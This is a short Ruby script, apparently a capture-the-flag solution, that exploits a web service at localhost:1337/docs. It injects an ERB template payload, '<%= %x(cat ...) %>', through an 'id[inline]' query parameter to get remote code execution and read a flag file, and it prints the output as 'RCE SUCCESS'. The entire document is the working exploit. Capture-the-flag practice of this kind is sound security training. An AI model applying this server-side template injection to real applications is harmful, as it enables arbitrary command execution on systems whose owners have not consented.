require 'net/http'
require 'uri'

# Config
BASE_URL = "http://localhost:1337"
ENDPOINT = "/docs"
FLAG_FILE = "/ed8ced0a73ed69ad8b986afd93efd404.txt"

puts "[*] Target: #{BASE_URL}#{ENDPOINT}"
puts "[*] Flag File: #{FLAG_FILE}"

# Construct Payload
# <%= %x(cat ...) %>
payload = "<%= %x(cat #{FLAG_FILE}) %>"

# Build URI with Query Parameters
uri = URI("#{BASE_URL}#{ENDPOINT}")
# Inject id[inline] parameter
params = { "id[inline]" => payload }
uri.query = URI.encode_www_form(params)

puts "[*] Sending Payload..."

begin
  response = Net::HTTP.get_response(uri)

  if response.is_a?(Net::HTTPSuccess)
    puts "\n[+] RCE SUCCESS! Output:"
    puts "-" * 40
    puts response.body.strip
    puts "-" * 40
  else
    puts "[-] Failed. Status: #{response.code}"
  end
rescue StandardError => e
  puts "[-] Error: #{e.message}"
end
